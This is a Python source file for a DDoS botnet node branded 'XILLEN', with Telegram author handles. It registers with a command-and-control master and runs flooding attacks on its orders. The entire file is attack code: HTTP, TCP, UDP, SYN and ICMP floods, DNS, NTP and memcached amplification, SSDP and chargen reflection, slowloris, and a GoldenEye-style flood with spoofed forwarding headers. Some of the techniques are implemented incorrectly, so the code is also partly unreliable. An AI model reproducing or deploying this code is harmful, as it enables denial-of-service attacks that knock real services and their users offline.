#!/usr/bin/env python3
import socket
import threading
import time
import json
import random
import hashlib
import base64
import os
import sys
import signal
from datetime import datetime
import colorama
from colorama import Fore, Back, Style
import logging
import subprocess
import platform
import psutil
import requests
import dns.resolver
import ipaddress
from urllib.parse import urlparse
import asyncio
import aiohttp
import aiofiles
import struct
import select

colorama.init()

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    MAGENTA = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    END = Style.RESET_ALL

class BotNode:
    def __init__(self, master_ip="127.0.0.1", master_port=1338):
        self.master_ip = master_ip
        self.master_port = master_port
        self.node_id = self.generate_node_id()
        self.running = False
        self.connected = False
        self.current_command = None
        self.worker_threads = []
        self.setup_logging()
        self.setup_sockets()
        
        self.stats = {
            "requests_sent": 0,
            "errors": 0,
            "cpu_usage": 0,
            "memory_usage": 0,
            "bandwidth": 0,
            "last_update": datetime.now()
        }
        
        self.attack_methods = {
            "http_flood": self.http_flood_worker,
            "tcp_flood": self.tcp_flood_worker,
            "udp_flood": self.udp_flood_worker,
            "syn_flood": self.syn_flood_worker,
            "icmp_flood": self.icmp_flood_worker,
            "dns_amplification": self.dns_amplification_worker,
            "ntp_amplification": self.ntp_amplification_worker,
            "memcached_amplification": self.memcached_amplification_worker,
            "ssdp_reflection": self.ssdp_reflection_worker,
            "chargen_reflection": self.chargen_reflection_worker,
            "slowloris": self.slowloris_worker,
            "goldeneye": self.goldeneye_worker,
            "mixed_attack": self.mixed_attack_worker
        }
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        
    def generate_node_id(self):
        hostname = platform.node()
        timestamp = str(int(time.time()))
        random_id = str(random.randint(1000, 9999))
        return f"{hostname}_{timestamp}_{random_id}"
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'bot_node_{self.node_id}.log', encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger('BotNode')
        
    def setup_sockets(self):
        try:
            self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.command_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.logger.info("Sockets initialized")
        except Exception as e:
            self.logger.error(f"Failed to setup sockets: {e}")
            
    def connect_to_master(self):
        try:
            self.command_socket.connect((self.master_ip, self.master_port))
            
            registration_data = {
                "type": "register",
                "node_id": self.node_id,
                "ip": self.get_local_ip(),
                "port": 0,
                "capabilities": list(self.attack_methods.keys()),
                "max_threads": 200,
                "platform": platform.system(),
                "cpu_count": psutil.cpu_count(),
                "memory_gb": round(psutil.virtual_memory().total / (1024**3), 2)
            }
            
            message = json.dumps(registration_data).encode('utf-8')
            self.command_socket.send(message)
            
            response = self.command_socket.recv(4096).decode('utf-8')
            response_data = json.loads(response)
            
            if response_data.get('status') == 'registered':
                self.connected = True
                self.logger.info(f"Successfully registered with master as {self.node_id}")
                return True
            else:
                self.logger.error("Registration failed")
                return False
                
        except Exception as e:
            self.logger.error(f"Failed to connect to master: {e}")
            return False
            
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
            
    def listen_for_commands(self):
        while self.running and self.connected:
            try:
                data = self.command_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                    
                command = json.loads(data)
                self.handle_command(command)
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error listening for commands: {e}")
                break
                
    def handle_command(self, command):
        command_id = command.get('command_id')
        attack_type = command.get('attack_type')
        payload = command.get('payload')
        threads = command.get('threads', 1)
        
        self.logger.info(f"Received command {command_id}: {attack_type} with {threads} threads")
        
        self.current_command = {
            "command_id": command_id,
            "attack_type": attack_type,
            "payload": payload,
            "threads": threads,
            "start_time": datetime.now()
        }
        
        if attack_type in self.attack_methods:
            self.execute_attack()
        else:
            self.logger.error(f"Unknown attack type: {attack_type}")
            
    def execute_attack(self):
        if not self.current_command:
            return
            
        attack_type = self.current_command['attack_type']
        threads = self.current_command['threads']
        
        self.logger.info(f"Starting {attack_type} attack with {threads} threads")
        
        self.worker_threads.clear()
        
        for i in range(threads):
            thread = threading.Thread(
                target=self.attack_methods[attack_type],
                args=(self.current_command['payload'],)
            )
            thread.daemon = True
            thread.start()
            self.worker_threads.append(thread)
            
    def http_flood_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        user_agents = payload.get('user_agents', self.user_agents)
        paths = payload.get('paths', ['/'])
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                )
                
                sock.send(request.encode())
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def tcp_flood_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        packet_size = payload.get('packet_size', 1024)
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                data = b'A' * packet_size
                sock.send(data)
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def udp_flood_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        packet_size = payload.get('packet_size', 1024)
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                data = os.urandom(packet_size)
                sock.sendto(data, (target, port))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def syn_flood_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                
                data = b'SYN' * 100
                sock.send(data)
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def icmp_flood_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        packet_size = payload.get('packet_size', 32)
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                
                data = b'PING' * 100
                sock.sendto(data, (target, 0))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def dns_amplification_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        dns_servers = payload.get('dns_servers', ['8.8.8.8'])
        query_domains = payload.get('query_domains', ['google.com'])
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                dns_server = random.choice(dns_servers)
                domain = random.choice(query_domains)
                
                query = self.create_dns_query(domain)
                sock.sendto(query, (dns_server, 53))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def create_dns_query(self, domain):
        query = bytearray()
        
        query_id = random.randint(1, 65535)
        query.extend(struct.pack('>H', query_id))
        query.extend(struct.pack('>H', 0x0100))
        query.extend(struct.pack('>H', 1))
        query.extend(struct.pack('>H', 0))
        query.extend(struct.pack('>H', 0))
        query.extend(struct.pack('>H', 0))
        
        for part in domain.split('.'):
            query.append(len(part))
            query.extend(part.encode())
        query.append(0)
        
        query.extend(struct.pack('>H', 1))
        query.extend(struct.pack('>H', 1))
        
        return bytes(query)
        
    def ntp_amplification_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        ntp_servers = payload.get('ntp_servers', ['pool.ntp.org'])
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                ntp_server = random.choice(ntp_servers)
                ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
                
                sock.sendto(ntp_query, (ntp_server, 123))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def memcached_amplification_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        memcached_servers = payload.get('memcached_servers', ['127.0.0.1:11211'])
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                server_info = random.choice(memcached_servers)
                server_ip, server_port = server_info.split(':')
                
                sock.connect((server_ip, int(server_port)))
                
                memcached_query = b'get ' + b'A' * 1000 + b'\r\n'
                sock.send(memcached_query)
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def ssdp_reflection_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        ssdp_query = payload.get('ssdp_query', 'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nST: upnp:rootdevice\r\n\r\n')
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                sock.sendto(ssdp_query.encode(), ('239.255.255.250', 1900))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def chargen_reflection_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        chargen_query = payload.get('chargen_query', '?')
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                sock.sendto(chargen_query.encode(), (target, 19))
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def slowloris_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        max_connections = payload.get('max_connections', 200)
        
        connections = []
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                if len(connections) < max_connections:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((target, port))
                    
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(self.user_agents)}\r\n"
                    sock.send(request.encode())
                    connections.append(sock)
                    self.stats['requests_sent'] += 1
                    
                for sock in connections[:]:
                    try:
                        sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        time.sleep(random.uniform(5, 15))
                    except:
                        connections.remove(sock)
                        sock.close()
                        
            except Exception as e:
                self.stats['errors'] += 1
                
    def goldeneye_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        user_agents = payload.get('user_agents', self.user_agents)
        paths = payload.get('paths', ['/'])
        
        start_time = time.time()
        
        while time.time() - start_time < duration and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((target, port))
                
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Real-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Client-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Originating-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Remote-IP: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
                    f"X-Remote-Addr: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n\r\n"
                )
                
                sock.send(request.encode())
                self.stats['requests_sent'] += 1
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                
    def mixed_attack_worker(self, payload):
        target = payload['target']
        port = payload['port']
        duration = payload['duration']
        attack_methods = payload.get('attack_methods', ['http_flood', 'tcp_flood'])
        method_rotation = payload.get('method_rotation', 5)
        
        start_time = time.time()
        method_index = 0
        
        while time.time() - start_time < duration and self.running:
            current_method = attack_methods[method_index % len(attack_methods)]
            
            if current_method in self.attack_methods:
                method_payload = payload.copy()
                method_payload['duration'] = method_rotation
                self.attack_methods[current_method](method_payload)
                
            method_index += 1
            
    def update_stats(self):
        while self.running:
            try:
                self.stats['cpu_usage'] = psutil.cpu_percent()
                self.stats['memory_usage'] = psutil.virtual_memory().percent
                self.stats['last_update'] = datetime.now()
                
                if self.connected and self.current_command:
                    status_data = {
                        "type": "status_update",
                        "node_id": self.node_id,
                        "status": "online",
                        "requests_sent": self.stats['requests_sent'],
                        "errors": self.stats['errors'],
                        "cpu_usage": self.stats['cpu_usage'],
                        "memory_usage": self.stats['memory_usage'],
                        "bandwidth": self.stats['bandwidth']
                    }
                    
                    try:
                        message = json.dumps(status_data).encode('utf-8')
                        self.command_socket.send(message)
                    except:
                        pass
                        
                time.sleep(5)
                
            except Exception as e:
                self.logger.error(f"Stats update error: {e}")
                
    def display_status(self):
        while self.running:
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(f"{Colors.RED}{Colors.BOLD}")
            print("╔══════════════════════════════════════════════════════════════╗")
            print("║                    XILLEN DDoS BOT NODE                      ║")
            print("║                                                              ║")
            print("║  ██╗  ██╗██╗██╗     ██╗     ███████╗███╗   ██╗            ║")
            print("║  ╚██╗██╔╝██║██║     ██║     ██╔════╝████╗  ██║            ║")
            print("║   ╚███╔╝ ██║██║     ██║     █████╗  ██╔██╗ ██║            ║")
            print("║   ██╔██╗ ██║██║     ██║     ██╔══╝  ██║╚██╗██║            ║")
            print("║  ██╔╝ ██╗██║███████╗███████╗███████╗██║ ╚████║            ║")
            print("║  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝            ║")
            print("║                                                              ║")
            print("║              DISTRIBUTED DENIAL OF SERVICE                  ║")
            print("║                                                              ║")
            print("║  Author: t.me/Bengamin_Button | t.me/XillenAdapter          ║")
            print("╚══════════════════════════════════════════════════════════════╝")
            print(f"{Colors.END}")
            
            print(f"{Colors.CYAN}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}║                    NODE STATUS                              ║{Colors.END}")
            print(f"{Colors.CYAN}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            status_color = Colors.GREEN if self.connected else Colors.RED
            print(f"{Colors.GREEN}Node ID: {Colors.WHITE}{self.node_id}{Colors.END}")
            print(f"{Colors.GREEN}Master: {Colors.WHITE}{self.master_ip}:{self.master_port}{Colors.END}")
            print(f"{Colors.GREEN}Status: {status_color}{'CONNECTED' if self.connected else 'DISCONNECTED'}{Colors.END}")
            print(f"{Colors.GREEN}Platform: {Colors.WHITE}{platform.system()}{Colors.END}")
            print(f"{Colors.GREEN}CPU Count: {Colors.WHITE}{psutil.cpu_count()}{Colors.END}")
            print(f"{Colors.GREEN}Memory: {Colors.WHITE}{round(psutil.virtual_memory().total / (1024**3), 2)} GB{Colors.END}")
            
            print(f"\n{Colors.YELLOW}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.YELLOW}{Colors.BOLD}║                    STATISTICS                              ║{Colors.END}")
            print(f"{Colors.YELLOW}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
            
            print(f"{Colors.GREEN}Requests Sent: {Colors.WHITE}{self.stats['requests_sent']:,}{Colors.END}")
            print(f"{Colors.GREEN}Errors: {Colors.WHITE}{self.stats['errors']:,}{Colors.END}")
            print(f"{Colors.GREEN}CPU Usage: {Colors.WHITE}{self.stats['cpu_usage']:.1f}%{Colors.END}")
            print(f"{Colors.GREEN}Memory Usage: {Colors.WHITE}{self.stats['memory_usage']:.1f}%{Colors.END}")
            print(f"{Colors.GREEN}Active Threads: {Colors.WHITE}{len(self.worker_threads)}{Colors.END}")
            
            if self.current_command:
                print(f"\n{Colors.MAGENTA}{Colors.BOLD}╔══════════════════════════════════════════════════════════════╗{Colors.END}")
                print(f"{Colors.MAGENTA}{Colors.BOLD}║                    CURRENT COMMAND                         ║{Colors.END}")
                print(f"{Colors.MAGENTA}{Colors.BOLD}╚══════════════════════════════════════════════════════════════╝{Colors.END}")
                
                elapsed = (datetime.now() - self.current_command['start_time']).total_seconds()
                print(f"{Colors.WHITE}Command ID: {self.current_command['command_id']}{Colors.END}")
                print(f"{Colors.WHITE}Attack Type: {self.current_command['attack_type']}{Colors.END}")
                print(f"{Colors.WHITE}Threads: {self.current_command['threads']}{Colors.END}")
                print(f"{Colors.WHITE}Elapsed: {elapsed:.1f}s{Colors.END}")
            
            print(f"\n{Colors.RED}{Colors.BOLD}Press Ctrl+C to stop{Colors.END}")
            time.sleep(2)
            
    def run(self):
        self.running = True
        
        print(f"{Colors.GREEN}Starting Bot Node...{Colors.END}")
        print(f"{Colors.GREEN}Node ID: {self.node_id}{Colors.END}")
        print(f"{Colors.GREEN}Connecting to master: {self.master_ip}:{self.master_port}{Colors.END}")
        
        if not self.connect_to_master():
            print(f"{Colors.RED}Failed to connect to master node!{Colors.END}")
            return
            
        command_thread = threading.Thread(target=self.listen_for_commands)
        command_thread.daemon = True
        command_thread.start()
        
        stats_thread = threading.Thread(target=self.update_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        status_thread = threading.Thread(target=self.display_status)
        status_thread.daemon = True
        status_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            
        print(f"{Colors.GREEN}Bot Node stopped!{Colors.END}")

def signal_handler(sig, frame):
    print(f"\n{Colors.RED}{Colors.BOLD}Shutting down Bot Node...{Colors.END}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    
    master_ip = input(f"{Colors.GREEN}Enter master IP (default 127.0.0.1): {Colors.END}") or "127.0.0.1"
    master_port = int(input(f"{Colors.GREEN}Enter master port (default 1338): {Colors.END}") or "1338")
    
    try:
        bot = BotNode(master_ip, master_port)
        bot.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}Bot Node stopped!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.END}")